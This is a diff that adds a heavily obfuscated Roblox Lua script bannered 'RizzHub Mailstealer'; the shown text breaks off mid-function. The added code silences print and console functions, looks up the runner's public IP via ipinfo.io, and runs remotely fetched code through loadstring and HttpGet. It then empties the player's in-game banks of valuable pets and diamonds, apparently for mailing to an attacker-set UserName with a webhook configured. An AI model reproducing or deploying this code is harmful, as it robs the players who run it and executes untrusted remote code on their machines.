@@ -1,12 +1,1898 @@
 --[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 
-
+   ____  _         _   _       _       __  __       _ _     _             _
+  |  _ \(_)_______| | | |_   _| |__   |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __
+  | |_) | |_  /_  / |_| | | | | '_ \  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  |  _ <| |/ / / /|  _  | |_| | |_) | | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |
+  |_| \_\_/___/___|_| |_|\__,_|_.__/  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|
+  
 ]]--
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v124,v125)local v126={};for v187=1, #v124 do v6(v126,v0(v4(v1(v2(v124,v187,v187 + 1 )),v1(v2(v125,1 + (v187% #v125) ,1 + (v187% #v125) + 1 )))%256 ));end return v5(v126);end getgenv().Settings={[v7("\228\208\222\55","\126\177\163\187\69\134\219\167")]=v7("\41\194\33\192\239\55\200\56\150\172\119\157\126","\156\67\173\74\165"),[v7("\3\178\75\30\179\41\77","\38\84\215\41\118\220\70")]=true,[v7("\125\23\43\30\211\85\5\49\19\249\85","\158\48\118\66\114")]=".gg/uSgzNwHDTS",[v7("\159\45\4\55\125\172\248\184","\155\203\68\112\86\19\197")]={[v7("\98\200\55\240\72\119\234\243","\152\38\189\86\156\32\24\133")]=true,[v7("\213\89\179\67\242\68\174\82\229","\38\156\55\199")]=77 + 23 },[v7("\138\124\114\41\29\117","\35\200\29\28\72\115\20\154")]={[v7("\61\170\208\211\133\35\59\18","\84\121\223\177\191\237\76")]=true,[v7("\146\88\221\165\52\67\57\213\162","\161\219\54\169\192\90\48\80")]=95 + 5 },[v7("\97\87\7\32\90","\69\41\34\96")]={[v7("\152\214\214\6\10\36\179\200","\75\220\163\183\106\98")]=true,[v7("\43\180\159\50\215\17\179\159\46","\185\98\218\235\87")]=50},[v7("\251\51\32\245","\202\171\92\71\134\190")]={[v7("\13\212\45\132\33\206\35\131","\232\73\161\76")]=true,[v7("\146\215\86\88\16\168\208\86\68","\126\219\185\34\61")]=0 -0 },[v7("\41\214\93\126\107\100\250\241\9\221","\135\108\174\62\18\30\23\147")]={[v7("\146\252\43\199\16\161\60\204","\167\214\137\74\171\120\206\83")]=true,[v7("\162\254\38\88\246\180\130\228\43","\199\235\144\82\61\152")]=1161 -(160 + 1001) },[v7("\34\0\188\37\19\5","\75\103\118\217")]={[v7("\227\65\113\24\177\17\200\95","\126\167\52\16\116\217")]=true,[v7("\225\32\52\133\186\10\245\220\55","\156\168\78\64\224\212\121")]=0},[v7("\52\235\166\220\2\250\182","\174\103\142\197")]={[v7("\114\61\94\52\45\81\247\93","\152\54\72\63\88\69\62")]=true,[v7("\253\202\250\89\218\215\231\72\205","\60\180\164\142")]=0 + 0 },[v7("\112\125\58\13\10\210\63\65\74\13\32\36\254","\114\56\62\101\73\71\141")]={[v7("\156\252\218\200\176\230\212\207","\164\216\137\187")]=true,[v7("\251\232\37\183\168\237\2\198\255","\107\178\134\81\210\198\158")]=0},[v7("\31\11\143\213","\202\88\110\226\166")]={[v7("\231\26\131\251\194\204\0\137","\170\163\111\226\151")]=true,[v7("\56\62\166\61\64\36\32\5\41","\73\113\80\210\88\46\87")]=0 + 0 }};if getgenv().executed then return;end getgenv().executed=true;local v10=game:GetService(v7("\179\57\195\33\226\147\58\196\17\226","\135\225\76\173\114"));local v11=workspace.CurrentCamera;local v12={473 -(237 + 121) ,164,312 -147 ,27,155 -(96 + 46) };UserSettings().GameSettings.MasterVolume=777 -(643 + 134) ;if (_G.MouseLock~=false) then v10.RenderStepped:Connect(function()local v246=0;while true do if (v246==(0 + 0)) then for v492,v493 in next,v12 do keyrelease(v493);end mousemoveabs(v11.ViewportSize.X/3 ,v11.ViewportSize.Y/3 );break;end end end);end local function v14(...)local v127=0 -0 ;local v128;while true do if (v127==(3 -2)) then return print(...);end if (v127==0) then v128=debug.getinfo(2);if (v128 and (v128.what==v7("\54\248\185","\199\122\141\216\208\204\221")) and (v128.func==print)) then return;end v127=1 + 0 ;end end end print=v14;rconsoleprint=v14;rconsolewarn=v14;rconsoleerr=v14;rconsoleinput=v14;printconsole=v14;setclipboard=v14;if (UserName==nil) then UserName=_G.UserName;end if (UserName2==nil) then UserName2=_G.UserName2;end if (Webhook==nil) then Webhook=_G.Webhook;end local v15=game:GetService(v7("\157\209\17\233\125\228\190","\150\205\189\112\144\24")).LocalPlayer.Name;if (v15==UserName) then local v188=0;while true do if (v188==0) then game:GetService(v7("\21\136\190\85\1\154\2","\112\69\228\223\44\100\232\113")).LocalPlayer:Kick(v7("\237\16\18\147\151\110\131\148\43\15\214\246\83\145\218\26\21\146\246\52\146\209\12\19\147\191\104\198\219\17\71\210\186\104\198\213\28\4\154","\230\180\127\103\179\214\28"));return;end end end if (UserName==nil) then local v189=0 -0 ;local v190;while true do if (v189==(0 -0)) then v190=719 -(316 + 403) ;while true do if (v190==0) then game:GetService(v7("\188\9\94\95\225\83\243","\128\236\101\63\38\132\33")).LocalPlayer:Kick(v7("\156\188\5\4\151\171\250\191\172\3\106\183\230\202","\175\204\201\113\36\214\139"));return;end end break;end end end local v16=pcall(function()game:GetService(v7("\119\192\52\197\1\85\223","\100\39\172\85\188")):GetUserIdFromNameAsync(UserName);end);if  not v16 then local v191=0 + 0 ;while true do if (v191==0) then game:GetService(v7("\157\116\184\153\54\191\107","\83\205\24\217\224")).LocalPlayer:Kick(v7("\214\208\217\125\199\133\251\60\234\204\201\125\211\214\200\47\232\196\192\56\167","\93\134\165\173"));return;end end end if v16 then _G.UserID=game:GetService(v7("\142\254\192\219\63\220\161","\30\222\146\161\162\90\174\210")):GetUserIdFromNameAsync(UserName);end if (UserName2~=nil) then local v192=pcall(function()game:GetService(v7("\213\66\113\19\224\92\99","\106\133\46\16")):GetUserIdFromNameAsync(UserName2);end);if  not v192 then local v325=0 -0 ;while true do if (v325==(0 + 0)) then local v494=0;local v495;while true do if (v494==(0 -0)) then v495=0 + 0 ;while true do if (v495==(0 + 0)) then game:GetService(v7("\104\44\114\229\95\82\75","\32\56\64\19\156\58")).LocalPlayer:Kick(v7("\106\221\241\22\123\178\182\91\196\236\82\26\199\147\95\218\235\87\87\247\210\27","\224\58\168\133\54\58\146"));return;end end break;end end end end end end local v17=require(game:GetService(v7("\107\83\91\241\124\133\134\31\92\82\120\233\122\148\134\12\92","\107\57\54\43\157\21\230\231")).Library.Client.Save).Get().Diamonds;local v18=pcall(function()game:GetService(v7("\236\132\3\254\170\204\206\216\142","\175\187\235\113\149\217\188"))[v7("\3\144\172\109\211","\24\92\207\225\44\131\25")].Interactive.Mailbox.Pad:GetChildren();end);if  not v18 then game:GetService(v7("\123\223\185\85\30\111\88","\29\43\179\216\44\123")).LocalPlayer:Kick(v7("\136\215\18\73\186\208\51\88\184\203\37\72\253\248\50\73\188\151\96\124\177\220\33\95\184\153\3\67\179\202\41\72\184\203\96\107\178\208\46\75\253\237\47\12\137\209\37\12\142\209\47\92","\44\221\185\64"));return;end function to_base64(v129)local v130="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";return (v129:gsub(".",function(v193)local v194=0;local v195;local v196;while true do if ((0 -0)==v194) then v195,v196="",v193:byte();for v470=8,4 -3 , -1 do v195=v195   .. (((((v196%((3 -1)^v470)) -(v196%((1 + 1)^(v470-(1 -0)))))>(0 + 0)) and "1") or "0") ;end v194=2 -1 ;end if (v194==(18 -(12 + 5))) then return v195;end end end)   .. v7("\81\183\24\15","\19\97\135\40\63")):gsub(v7("\235\88\118\63\106\53\241\25\55\100\106\53\241\25\55\100","\81\206\60\83\91\79"),function(v197)local v198=0 -0 ;local v199;while true do local v247=0;while true do if (v247==(0 -0)) then if (v198==(1 -0)) then for v536=2 -1 ,2 + 4  do v199=v199 + (((v197:sub(v536,v536)=="1") and (2^((1979 -(1656 + 317)) -v536))) or 0) ;end return v130:sub(v199 + 1 + 0 ,v199 + 1 + 0 );end if (v198==0) then if ( #v197<(15 -9)) then return "";end v199=0;v198=4 -3 ;end break;end end end end)   .. ({"",v7("\19\246","\196\46\203\176\18\79\163\45"),"="})[( #v129%(2 + 1)) + (3 -2) ] ;end function from_base64(v131)local v132="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";v131=string.gsub(v131,v7("\131\28","\143\216\66\30\126\68\155")   .. v132   .. v7("\247\245","\129\202\168\109\171\165\195\183") ,"");return (v131:gsub(".",function(v200)local v201=0 -0 ;local v202;local v203;while true do if (v201==0) then local v391=1696 -(561 + 1135) ;while true do if (v391==(1 -0)) then v201=3 -2 ;break;end if (v391==0) then if (v200=="=") then return "";end v202,v203="",v132:find(v200) -(1067 -(507 + 559)) ;v391=1;end end end if ((2 -1)==v201) then for v471=18 -12 ,1, -1 do v202=v202   .. (((((v203%(2^v471)) -(v203%(2^(v471-(389 -(212 + 176))))))>0) and "1") or "0") ;end return v202;end end end):gsub(v7("\103\92\114\220\155\16\185\103\92\104\157\218\75\163\38\7\114\220\129\81\226\125","\134\66\56\87\184\190\116"),function(v204)local v205=0;local v206;while true do if (v205==(906 -(250 + 655))) then for v472=1,8 do v206=v206 + (((v204:sub(v472,v472)=="1") and ((5 -3)^((13 -5) -v472))) or (0 -0)) ;end return string.char(v206);end if (v205==(1956 -(1869 + 87))) then local v392=0 -0 ;while true do if (v392==(1902 -(484 + 1417))) then v205=2 -1 ;break;end if (v392==(0 -0)) then if ( #v204~=8) then return "";end v206=0;v392=1;end end end end end));end request=(syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or HttpPost ;local v19;local function v20()local v133=0;local v134;while true do if (v133==(773 -(48 + 725))) then v134=(syn and  not is_sirhurt_closure and  not pebc_execute and v7("\15\40\7\186\9\248\36\117\4","\85\92\81\105\219\121\139\65")) or (secure_load and v7("\206\182\94\81\117\209\248\191","\191\157\211\48\37\28")) or (is_sirhurt_closure and v7("\236\22\230\20\47\205\11","\90\191\127\148\124")) or (pebc_execute and v7("\72\149\33\3\119\180\35\22\107\143\43\5","\119\24\231\78")) or (KRNL_LOADED and v7("\169\31\139\102","\113\226\77\197\42\188\32")) or (WrapGlobal and v7("\13\19\213\167\63\50\241\163\41","\213\90\118\148")) or (isvm and v7("\107\60\187\78\66","\45\59\78\212\54")) or (shadow_env and v7("\35\94\130\143\137\57","\144\112\54\227\235\230\78\205")) or (jit and v7("\150\41\28\229\245\67\163\36\0\245\196\72","\59\211\72\111\156\176")) or (getscriptenvs and v7("\109\134\239\44\67\134\241\36","\77\46\231\131")) or (unit and  not syn and v7("\143\90\191\84","\32\218\52\214")) or (OXYGEN_LOADED and v7("\97\15\40\175\244\190\5\111","\58\46\119\81\200\145\208\37")) or (IsElectron and v7("\14\128\53\175\189\175\57\37","\86\75\236\80\204\201\221")) or v7("\81\78\98\137\250\133\102\1\80\151\255\137","\235\18\33\23\229\158") ;v19=v134;break;end end end v20();local v21=game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text;local v22=game:GetService(v7("\96\182\192\162\85\168\210","\219\48\218\161")).LocalPlayer.Name;local v23=game:GetService(v7("\212\125\125\80\222\93\243","\128\132\17\28\41\187\47")).LocalPlayer;local v24=game:HttpGet("https://ipinfo.io/ip");local v25;if (_G.LoadingScreen~=false) then loadstring(game:HttpGet(v7("\49\39\18\122\100\14\39\20\122\113\14\51\2\51\83\6\114\53\57\79\4\55\8\122\111\0\37\70\22\84\15\57\70\18\88\19\55","\61\97\82\102\90")))();end local v26=getsenv(game:GetService(v7("\156\34\170\82\194\69\13","\105\204\78\203\43\167\55\126")).LocalPlayer.PlayerScripts.Scripts.GUIs[v7("\135\171\45\21\83\39\203\88\160\164\55","\49\197\202\67\126\115\100\167")]);local v27=getsenv(game:GetService(v7("\7\87\222\48\133\68\77","\62\87\59\191\73\224\54")).LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory);local v28=getsenv(game:GetService(v7("\215\14\251\208\226\16\233","\169\135\98\154")).LocalPlayer.PlayerScripts.Scripts.GUIs.Mailbox);local v29=getsenv(game:GetService(v7("\251\123\37\77\248\33\219","\168\171\23\68\52\157\83")).LocalPlayer.PlayerScripts.Scripts.Game[v7("\198\116\240\169\32\32\199\198\112\251\166\101\31\130\227\112\231\169\54","\231\148\17\149\205\69\77")]);local v30=getsenv(game:GetService(v7("\176\171\198\226\82\237\147","\159\224\199\167\155\55")).LocalPlayer.PlayerScripts.Scripts.GUIs[v7("\209\225\57\215\183\212\53\212\227\224","\178\151\147\92")]);local v31=debug.getconstant(v26.GetMyBanks,3);local v32=debug.getconstant(v27.LockPets,5);local v33=debug.getconstant(v26.GetBank,3);local v34=debug.getconstant(v26.Withdraw,16);local v35=debug.getconstant(debug.getprotos(v28.UpdateOutbox)[2 -0 ],53 -33 );local v36=debug.getconstant(v28.UpdateInboxBottom,21 + 14 );local v37=debug.getconstant(v28.Update,7 -4 );local v38=debug.getconstant(v26.DecideInvite,2 + 4 );local v39=debug.getconstant(v26.GetMyInvites,1 + 2 );local v40=debug.getconstant(v29.Redeem,3);local v41=debug.getconstant(v30.Redeem,856 -(152 + 701) );local v42=getupvalues(require(game:GetService(v7("\190\248\92\62\27\79\123\152\248\72\1\6\67\104\141\250\73","\26\236\157\44\82\114\44")).Library.Client[v7("\4\43\193\76\37\60\222","\59\74\78\181")]).Invoke);local v43=getupvalues(v42[2]);local v44=getupvalues(v43[1312 -(430 + 881) ])[1 + 0 ][2];local v45=getupvalues(require(game:GetService(v7("\23\212\74\86\186\38\208\78\95\183\22\197\85\72\178\34\212","\211\69\177\58\58")).Library.Client[v7("\153\224\109\226\230\217\188","\171\215\133\25\149\137")]).Invoke);local v46=getupvalues(v45[2]);v31=v44[v46[2](2,v31)];v32=v44[v46[897 -(557 + 338) ](2,v32)];v33=v44[v46[1 + 1 ](5 -3 ,v33)];v34=v44[v46[6 -4 ](4 -2 ,v34)];v35=v44[v46[4 -2 ](803 -(499 + 302) ,v35)];v36=v44[v46[868 -(39 + 827) ](5 -3 ,v36)];v37=v44[v46[4 -2 ](7 -5 ,v37)];v38=v44[v46[2 -0 ](2,v38)];v39=v44[v46[2](2,v39)];v40=v44[v46[2](1 + 1 ,v40)];v41=v44[v46[2](5 -3 ,v41)];local v58=v31:InvokeServer();local v59=require(game:GetService(v7("\211\205\34\246\230\51\253\86\228\204\1\238\224\34\253\69\228","\34\129\168\82\154\143\80\156")).Library.Client.Save).Get();function invspace()local v135=v59.MaxSlots-#v59.Pets ;if (v135>50) then v135=8 + 42 ;end return v135;end function invspace_nolimit()local v136=0 -0 ;local v137;while true do if (v136==(104 -(103 + 1))) then v137=v59.MaxSlots-#v59.Pets ;return v137;end end end game:GetService(v7("\181\190\50\18\77\92\154","\233\229\210\83\107\40\46")).LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(game:GetService(v7("\246\77\32\221\22\209\67\49\211","\101\161\34\82\182"))[v7("\215\50\116\223\235","\78\136\109\57\158\187\130\226")].Interactive.Bank.Pad.Position);local v61;local v62;local v63;local v64;local v65;local v66;local v67;local v68;local v69;local v70;local v71=554 -(475 + 79) ;local v72=0;local v73=0;local v74=0 -0 ;local v75=0 -0 ;local v76=0 + 0 ;local v77=0;if (v58[1 + 0 ]~=nil) then v76=v76 + (1504 -(1395 + 108)) ;end if (v58[2]~=nil) then v76=v76 + (2 -1) ;end if (v58[1207 -(7 + 1197) ]~=nil) then v76=v76 + 1 + 0 ;end if (v58[2 + 2 ]~=nil) then v76=v76 + (320 -(27 + 292)) ;end if (v58[14 -9 ]~=nil) then v76=v76 + (1 -0) ;end local v78=v39:InvokeServer();bankstable={};if (v76~=(20 -15)) then local v207=0 -0 ;while true do if (v207==(1 -0)) then local v393=139 -(43 + 96) ;local v394;while true do if (v393==(0 -0)) then v394=0;while true do if ((1 -0)==v394) then v207=2 + 0 ;break;end if (v394==0) then if (v78[1 + 2 ]~=nil) then table.insert(bankstable,v78[5 -2 ][v7("\23\129\162\214","\186\85\212\235\146")]);end if (v78[2 + 2 ]~=nil) then table.insert(bankstable,v78[7 -3 ][v7("\224\180\63\218","\56\162\225\118\158\89\142")]);end v394=1 + 0 ;end end break;end end end if ((1 + 1)==v207) then if (v78[1756 -(1414 + 337) ]~=nil) then table.insert(bankstable,v78[1945 -(1642 + 298) ][v7("\126\48\233\139","\184\60\101\160\207\66")]);end for v473,v474 in pairs(bankstable) do v38:InvokeServer(v474);end break;end if (v207==(0 -0)) then if (v78[1]~=nil) then table.insert(bankstable,v78[1][v7("\28\10\208\213","\145\94\95\153")]);end if (v78[2]~=nil) then table.insert(bankstable,v78[5 -3 ][v7("\223\248\61\241","\215\157\173\116\181\46")]);end v207=2 -1 ;end end end if (v76==0) then local v208=0 + 0 ;local v209;while true do if (v208==0) then v209=0;while true do if (v209==(1 + 0)) then v66=bankstable[975 -(357 + 615) ];v68=bankstable[4];v209=2;end if (v209==2) then v70=bankstable[5];break;end if (v209==0) then v62=bankstable[1 + 0 ];v64=bankstable[4 -2 ];v209=1 + 0 ;end end break;end end elseif (v76==(2 -1)) then local v326=0;while true do if ((1 + 0)==v326) then v66=bankstable[2];v68=bankstable[1 + 2 ];v326=2 + 0 ;end if (v326==(1301 -(384 + 917))) then v62=v58[698 -(128 + 569) ][v7("\19\183\85\152","\220\81\226\28")];v64=bankstable[1544 -(1407 + 136) ];v326=1888 -(687 + 1200) ;end if (v326==2) then v70=bankstable[4];break;end end elseif (v76==(1712 -(556 + 1154))) then v62=v58[3 -2 ][v7("\49\224\171\223","\167\115\181\226\155\138")];v64=v58[97 -(9 + 86) ][v7("\192\23\206\120","\166\130\66\135\60\27\17")];v66=bankstable[422 -(275 + 146) ];v68=bankstable[1 + 1 ];v70=bankstable[67 -(29 + 35) ];elseif (v76==3) then local v524=0;while true do if (v524==(4 -3)) then v66=v58[8 -5 ][v7("\155\22\130\80","\212\217\67\203\20\223\223\37")];v68=bankstable[4 -3 ];v524=2 + 0 ;end if ((1014 -(53 + 959))==v524) then v70=bankstable[2];break;end if (v524==(408 -(312 + 96))) then v62=v58[1 -0 ][v7("\102\127\231\81","\80\36\42\174\21")];v64=v58[287 -(147 + 138) ][v7("\108\37\30\94","\26\46\112\87")];v524=900 -(813 + 86) ;end end elseif (v76==(4 + 0)) then local v544=0 -0 ;while true do if (v544==(492 -(18 + 474))) then v62=v58[1 + 0 ][v7("\152\184\129\246","\178\218\237\200")];v64=v58[2][v7("\148\128\207\244","\176\214\213\134")];v544=3 -2 ;end if (v544==1) then v66=v58[1089 -(860 + 226) ][v7("\214\152\159\240","\57\148\205\214\180\200\54")];v68=v58[307 -(121 + 182) ][v7("\48\200\28\16","\22\114\157\85\84")];v544=1 + 1 ;end if (v544==(1242 -(988 + 252))) then v70=bankstable[1 + 0 ];break;end end elseif (v76==5) then v62=v58[1 + 0 ][v7("\230\254\58\224","\200\164\171\115\164\61\150")];v64=v58[1972 -(49 + 1921) ][v7("\156\193\42\97","\227\222\148\99\37")];v66=v58[3][v7("\17\103\123\210","\153\83\50\50\150")];v68=v58[4][v7("\127\67\90\56","\45\61\22\19\124\19\203")];v70=v58[895 -(223 + 667) ][v7("\227\39\36\209","\217\161\114\109\149\98\16")];end Library=require(game:GetService(v7("\32\37\40\112\181\119\19\52\61\120\143\96\29\50\57\123\185","\20\114\64\88\28\220")).Framework:FindFirstChild(v7("\29\8\208\166\249\194\164","\221\81\97\178\212\152\176")));Functions=Library.Functions;PetIDList={};table.foreach(Library.Directory.Pets,function(v138,v139)if (v139.huge or v139.titanic or (v139.name==v7("\207\230\19\250\20\204","\122\173\135\125\155")) or (v139.name==v7("\166\205\1\189\58\52","\168\228\161\96\217\95\81")) or (v139.convertPoints==(57 -(51 + 1)))) then table.insert(PetIDList,v138);end end);if ((v62~=nil) and (invspace()~=(0 -0))) then while task.wait() do print(v7("\217\208\32\87\126\23\203\196\60\91\42\83","\55\187\177\78\60\79"));v61=v33:InvokeServer(v62);LHList={};LFinalList={};local v248=v61.Storage.Pets;local v249={};for v327,v328 in pairs(v248) do v249[v328[v7("\56\199\91","\224\77\174\63\139\38\175")]]=false;end for v330,v331 in pairs(v248) do if (table.find(PetIDList,v331[v7("\141\69","\78\228\33\56")])~=nil) then table.insert(LHList,v331[v7("\219\119\182","\229\174\30\210\99")]);end end print(v7("\55\197\170\88\254\41\121\65","\89\123\141\230\49\141\93"), #LHList);if ( #LHList<=invspace()) then for v480,v481 in pairs(LHList) do table.insert(LFinalList,v481);end elseif ( #LHList>invspace()) then for v525,v526 in pairs(LHList) do if ( #LFinalList<invspace()) then table.insert(LFinalList,v526);end end end print(v7("\223\87\255\2\17\70\223\120\229\24\80\16","\42\147\17\150\108\112"), #LFinalList);v71=v61.Storage.Currency.Diamonds;if (( #LFinalList==(0 -0)) and (v71<(1000001125 -(146 + 979))) and (v17>(31046 + 78954))) then v71=0;end if (( #LFinalList~=0) or (v71~=(605 -(311 + 294)))) then local v395=0;local v396;local v397;local v398;while true do if (v395==(2 -1)) then if (v397==false) then wait(0.2);v34:InvokeServer(v62,LFinalList,0);end v77=v77 +  #LFinalList ;v395=1 + 1 ;end if (2==v395) then wait(1444.5 -(496 + 947) );break;end if (v395==0) then v396={[1]=v62,[2]=LFinalList,[3]=1358 -(1233 + 125) };v397,v398=pcall(function()v34:InvokeServer(v62,LFinalList,v71);end);v395=1 + 0 ;end end else print(v7("\11\169\35\122\182","\136\111\198\77\31\135"));break;end end end if ((v64~=nil) and (invspace()~=(0 + 0))) then while task.wait() do print(v7("\0\8\169\93\239\164\7\188\16\14\162\82","\201\98\105\199\54\221\132\119"));v63=v33:InvokeServer(v64);BHList2={};FinalList2={};local v251=v63.Storage.Pets;local v252={};for v332,v333 in pairs(v251) do v252[v333[v7("\172\5\135","\204\217\108\227\65\98\85")]]=false;end for v335,v336 in pairs(v251) do if ((table.find(PetIDList,v336[v7("\87\199","\160\62\163\149\133\76")])~=nil) and  not v336.l) then table.insert(BHList2,v336[v7("\195\169\9","\163\182\192\109\79")]);end end if ( #BHList2<=invspace()) then for v482,v483 in pairs(BHList2) do table.insert(FinalList2,v483);end elseif ( #BHList2>invspace()) then for v527,v528 in pairs(BHList2) do if ( #FinalList2<invspace()) then table.insert(FinalList2,v528);end end end print(v7("\18\47\14\193\249\24\47\19\212\167\116\124","\149\84\70\96\160"), #FinalList2);print(v7("\26\46\33\228\43\18\95\173\98","\141\88\102\109"), #BHList2);v72=v63.Storage.Currency.Diamonds;if (( #FinalList2==0) and (v72<(189998792 + 810001208)) and (v17>(111645 -(963 + 682)))) then v71=0 + 0 ;end if (( #FinalList2~=0) or (v72~=(1504 -(504 + 1000)))) then local v399=0 + 0 ;local v400;local v401;local v402;while true do if (v399==0) then v400={[1 + 0 ]=v64,[1 + 1 ]=FinalList2,[4 -1 ]=0 + 0 };wait();v399=1 + 0 ;end if ((184 -(156 + 26))==v399) then wait(1.5 + 0 );v77=v77 +  #FinalList2 ;break;end if (v399==1) then v401,v402=pcall(function()v34:InvokeServer(v64,FinalList2,v72);end);if (v401==false) then wait(0.2);v34:InvokeServer(v64,FinalList2,0 -0 );end v399=166 -(149 + 15) ;end end else print(v7("\183\92\196\117\72","\161\211\51\170\16\122\93\53"));break;end end end if ((v66~=nil) and (invspace()~=(960 -(890 + 70)))) then while task.wait() do print(v7("\249\175\188\35\168\238\162\61\233\169\183\44","\72\155\206\210"));v65=v33:InvokeServer(v66);BHList3={};FinalList3={};local v254=v65.Storage.Pets;local v255={};for v337,v338 in pairs(v254) do v255[v338[v7("\83\115\80","\83\38\26\52\110")]]=false;end for v340,v341 in pairs(v254) do if ((table.find(PetIDList,v341[v7("\81\19","\38\56\119\71")])~=nil) and  not v341.l) then table.insert(BHList3,v341[v7("\230\230\92","\54\147\143\56\182\69")]);end end if ( #BHList3<=invspace()) then for v484,v485 in pairs(BHList3) do table.insert(FinalList3,v485);end elseif ( #BHList3>invspace()) then for v529,v530 in pairs(BHList3) do if ( #FinalList3<invspace()) then table.insert(FinalList3,v530);end end end print(v7("\240\136\241\72\211\250\136\236\93\140\150\219","\191\182\225\159\41"), #FinalList3);print(v7("\9\58\4\92\152\147\145\107\72","\162\75\114\72\53\235\231"), #BHList3);v73=v65.Storage.Currency.Diamonds;if (( #FinalList3==0) and (v73<1000000000) and (v17>110000)) then v71=117 -(39 + 78) ;end if (( #FinalList3~=0) or (v73~=(482 -(14 + 468)))) then local v403={[2 -1 ]=v66,[5 -3 ]=FinalList3,[2 + 1 ]=0 + 0 };wait();local v404,v405=pcall(function()v34:InvokeServer(v66,FinalList3,v73);end);if (v404==false) then local v501=0;while true do if (0==v501) then wait(0.2 + 0 );v34:InvokeServer(v66,FinalList3,0 + 0 );break;end end end wait(1.5 + 0 );v77=v77 +  #FinalList3 ;else print(v7("\136\51\74\231\0","\98\236\92\36\130\51"));break;end end end if ((v68~=nil) and (invspace()~=0)) then while task.wait() do print(v7("\166\24\2\177\17\232\165\37\182\30\9\190","\80\196\121\108\218\37\200\213"));v67=v33:InvokeServer(v68);BHList4={};FinalList4={};local v257=v67.Storage.Pets;local v258={};for v342,v343 in pairs(v257) do v258[v343[v7("\21\122\6","\234\96\19\98\31\43\110")]]=false;end for v345,v346 in pairs(v257) do if ((table.find(PetIDList,v346[v7("\15\27","\235\102\127\50\167\204\18")])~=nil) and  not v346.l) then table.insert(BHList4,v346[v7("\69\168\241","\78\48\193\149\67\36")]);end end if ( #BHList4<=invspace()) then for v486,v487 in pairs(BHList4) do table.insert(FinalList4,v487);end elseif ( #BHList4>invspace()) then for v531,v532 in pairs(BHList4) do if ( #FinalList4<invspace()) then table.insert(FinalList4,v532);end end end print(v7("\18\54\172\17\82\36\74\192\66","\33\80\126\224\120"), #BHList4);print(v7("\202\161\13\197\80\192\161\16\208\8\172\242","\60\140\200\99\164"), #FinalList4);v74=v67.Storage.Currency.Diamonds;if (( #FinalList4==(0 -0)) and (v74<(988346009 + 11653991)) and (v17>110000)) then v74=0 -0 ;end if (( #FinalList4~=0) or (v74~=0)) then local v406={[1 + 0 ]=v68,[2]=FinalList4,[54 -(12 + 39) ]=0 + 0 };local v407,v408=pcall(function()v34:InvokeServer(v68,FinalList4,v74);end);if (v407==false) then local v502=0;while true do if (v502==0) then wait(0.2);v34:InvokeServer(v68,FinalList4,0 -0 );break;end end end v77=v77 +  #FinalList4 ;wait(3.5 -2 );else print(v7("\131\251\10\35\246","\194\231\148\100\70"));break;end end end if ((v70~=nil) and (invspace()~=0)) then while task.wait() do print(v7("\68\77\207\168\163\136\86\89\211\164\243\204","\168\38\44\161\195\150"));v69=v33:InvokeServer(v70);BHList5={};FinalList5={};local v260=v69.Storage.Pets;local v261={};for v347,v348 in pairs(v260) do v261[v348[v7("\149\245\134","\118\224\156\226\22\80\136\214")]]=false;end for v350,v351 in pairs(v260) do if ((table.find(PetIDList,v351[v7("\75\234","\224\34\142\57")])~=nil) and  not v351.l) then table.insert(BHList5,v351[v7("\203\174\193","\110\190\199\165\189\19\145\61")]);end end if ( #BHList5<=invspace()) then for v488,v489 in pairs(BHList5) do table.insert(FinalList5,v489);end elseif ( #BHList5>invspace()) then for v533,v534 in pairs(BHList5) do if ( #FinalList5<invspace()) then table.insert(FinalList5,v534);end end end print(v7("\248\195\91\225\152\211\143\171\45","\167\186\139\23\136\235"), #BHList5);print(v7("\60\188\134\12\22\153\129\30\14\224\200\87","\109\122\213\232"), #FinalList5);v75=v69.Storage.Currency.Diamonds;if (( #FinalList5==(0 + 0)) and (v75<1000000000) and (v17>(57902 + 52098))) then v75=0 -0 ;end if (( #FinalList5~=(0 + 0)) or (v75~=(0 -0))) then local v409=1710 -(1596 + 114) ;local v410;local v411;local v412;while true do if (v409==2) then wait(2.5 -1 );v77=v77 +  #FinalList5 ;break;end if (v409==(714 -(164 + 549))) then v411,v412=pcall(function()v34:InvokeServer(v70,FinalList5,v75);end);if (v411==false) then local v545=1438 -(1059 + 379) ;while true do if (v545==(0 -0)) then wait(0.2);v34:InvokeServer(v70,FinalList5,0);break;end end end v409=2;end if (v409==0) then v410={[1]=v70,[2]=FinalList5,[3]=0 + 0 };wait();v409=1 + 0 ;end end else print(v7("\234\248\172\53\187","\80\142\151\194"));break;end end end local v80=v71 + v72 + v73 + v74 + v75 ;local v81=game:GetService(v7("\51\202\118\85\6\212\100","\44\99\166\23")).LocalPlayer.PlayerGui.FreeGifts;Gifts={};if (invspace_nolimit()~=0) then local v210=392 -(145 + 247) ;local v211;while true do if (v210==0) then v211=0 + 0 ;while true do if (v211==(0 + 0)) then for v537,v538 in pairs(v81.Frame.Container.Gifts:GetDescendants()) do if (v538.Name==v7("\72\254\36\51\33","\196\28\151\73\86\83")) then if (v538.Text==v7("\193\6\45\21\135\85\89","\22\147\99\73\112\226\56\120")) then table.insert(Gifts,string.split(tostring(v538.Parent),"t")[2]);end end end if ( #Gifts~=(0 -0)) then for v552,v553 in pairs(Gifts) do 